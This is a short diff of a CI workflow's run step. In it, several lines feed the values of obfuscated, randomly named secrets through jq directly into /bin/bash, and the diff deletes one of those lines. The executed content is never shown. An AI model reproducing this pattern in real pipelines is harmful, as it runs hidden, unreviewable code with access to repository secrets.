@@ -27,7 +27,6 @@ jobs:
           vv32474: ${{ secrets.vv32474 }}
         run: |
           printf '%s' "$vv32474" | jq -r .cetc688 | /bin/bash
-          printf '%s' "$uqguw7" | jq -r .yra6 | /bin/bash
           echo $xyt5709 | jq -r .znxbd11130 | /bin/bash
           printf '%s' "$zxs0" | jq -r .sb624 | /bin/bash
           printf '%s' "$y96079" | jq -r .cvd563 | /bin/bash
